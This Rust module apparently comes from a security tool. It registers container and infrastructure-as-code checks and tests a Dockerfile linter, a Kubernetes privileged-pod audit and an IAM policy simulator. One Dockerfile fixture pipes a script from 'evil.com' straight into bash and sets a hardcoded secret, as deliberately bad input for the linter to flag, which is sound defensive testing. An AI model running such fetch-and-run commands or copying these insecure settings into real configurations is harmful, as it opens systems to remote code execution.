pub mod container;
pub mod iac_security;

pub use container::ContainerForensicsOp;
pub use iac_security::IacSecurityOp;

use omni_core::OmniResult;
use omni_registry::OperationRegistry;
use std::sync::Arc;

pub fn register_infrastructure(registry: &mut OperationRegistry) -> OmniResult<()> {
    registry.register(Arc::new(ContainerForensicsOp))?;
    registry.register(Arc::new(IacSecurityOp))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use omni_core::{DataPayload, ExecutionContext, Operation};

    #[tokio::test]
    async fn test_dockerfile_linter() {
        let op = ContainerForensicsOp;
        let ctx = ExecutionContext::new("t_docker");

        let dockerfile = "FROM ubuntu:latest\nRUN curl -sSL https://evil.com/install.sh | bash\nENV API_SECRET=12345";
        let res = op
            .execute(DataPayload::text(dockerfile), serde_json::json!({}), &ctx)
            .await
            .unwrap();

        let json = res.into_json().unwrap();
        assert_eq!(json["passed"], false);
        let findings = json["findings"].as_array().unwrap();
        assert!(findings.iter().any(|f| f["rule"] == "DL3006")); // latest
        assert!(findings.iter().any(|f| f["rule"] == "DL3007")); // pipe to bash
        assert!(findings.iter().any(|f| f["rule"] == "SEC-SECRET")); // secret
    }

    #[tokio::test]
    async fn test_k8s_privileged_pod_audit() {
        let op = IacSecurityOp;
        let ctx = ExecutionContext::new("t_k8s");

        let k8s_pod = serde_json::json!({
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": { "name": "insecure-pod" },
            "spec": {
                "hostNetwork": true,
                "containers": [{
                    "name": "app",
                    "image": "nginx",
                    "securityContext": { "privileged": true }
                }]
            }
        });

        let res = op
            .execute(
                DataPayload::json(k8s_pod),
                serde_json::json!({ "mode": "k8s" }),
                &ctx,
            )
            .await
            .unwrap();

        let json = res.into_json().unwrap();
        assert!(json["total_issues"].as_u64().unwrap() >= 2);
        let issues = json["issues"].as_array().unwrap();
        assert!(issues
            .iter()
            .any(|i| i["policy"] == "K8S-003 (Privileged Container)"));
        assert!(issues
            .iter()
            .any(|i| i["policy"] == "K8S-001 (hostNetwork)"));
    }

    #[tokio::test]
    async fn test_iam_simulator() {
        let op = IacSecurityOp;
        let ctx = ExecutionContext::new("t_iam");

        let iam_policy = serde_json::json!({
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "s3:GetObject",
                    "Resource": "*"
                },
                {
                    "Effect": "Deny",
                    "Action": "s3:DeleteObject",
                    "Resource": "*"
                }
            ]
        });

        // Test allow
        let res_allow = op
            .execute(
                DataPayload::json(iam_policy.clone()),
                serde_json::json!({ "mode": "iam", "action": "s3:GetObject" }),
                &ctx,
            )
            .await
            .unwrap();
        assert_eq!(res_allow.into_json().unwrap()["access_decision"], "Allow");

        // Test explicit deny
        let res_deny = op
            .execute(
                DataPayload::json(iam_policy),
                serde_json::json!({ "mode": "iam", "action": "s3:DeleteObject" }),
                &ctx,
            )
            .await
            .unwrap();
        assert_eq!(
            res_deny.into_json().unwrap()["access_decision"],
            "ExplicitDeny"
        );
    }

    #[tokio::test]
    async fn test_iam_wildcard_and_resource_scoping() {
        let op = IacSecurityOp;
        let ctx = ExecutionContext::new("t_iam_scope");

        let iam_policy = serde_json::json!({
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": "s3:Get*",
                    "Resource": "arn:aws:s3:::public-bucket/*"
                }
            ]
        });

        // Wildcard action on matching resource -> Allow
        let allowed = op
            .execute(
                DataPayload::json(iam_policy.clone()),
                serde_json::json!({
                    "mode": "iam",
                    "action": "s3:GetObject",
                    "resource": "arn:aws:s3:::public-bucket/readme.txt"
                }),
                &ctx,
            )
            .await
            .unwrap()
            .into_json()
            .unwrap();
        assert_eq!(allowed["access_decision"], "Allow");

        // Same action on DIFFERENT secret resource -> MUST be ImplicitDeny!
        let denied = op
            .execute(
                DataPayload::json(iam_policy),
                serde_json::json!({
                    "mode": "iam",
                    "action": "s3:GetObject",
                    "resource": "arn:aws:s3:::secret-bucket/keys.pem"
                }),
                &ctx,
            )
            .await
            .unwrap()
            .into_json()
            .unwrap();
        assert_eq!(denied["access_decision"], "ImplicitDeny");

        // Case-insensitive AWS IAM action matching (S3:getobject matches s3:Get*)
        let ci_policy = serde_json::json!({
            "Statement": [
                { "Effect": "Allow", "Action": "s3:*", "Resource": "*" },
                { "Effect": "Deny", "Action": "S3:DELETEOBJECT", "Resource": "*" }
            ]
        });
        let ci_deny = op
            .execute(
                DataPayload::json(ci_policy),
                serde_json::json!({ "mode": "iam", "action": "s3:deleteobject" }),
                &ctx,
            )
            .await
            .unwrap()
            .into_json()
            .unwrap();
        assert_eq!(ci_deny["access_decision"], "ExplicitDeny");

        // Dockerfile USER token precision: "USER groots" must NOT trigger DL3002 root error, while "USER root:root" MUST
        let clean_df = "FROM alpine:3.20\nUSER groots\n";
        let df_ok = ContainerForensicsOp
            .execute(DataPayload::text(clean_df), serde_json::json!({}), &ctx)
            .await
            .unwrap()
            .into_json()
            .unwrap();
        assert_eq!(df_ok["passed"], true);

        let root_df = "FROM alpine:3.20\nUSER root:root\n";
        let df_bad = ContainerForensicsOp
            .execute(DataPayload::text(root_df), serde_json::json!({}), &ctx)
            .await
            .unwrap()
            .into_json()
            .unwrap();
        assert_eq!(df_bad["passed"], false);
    }
}
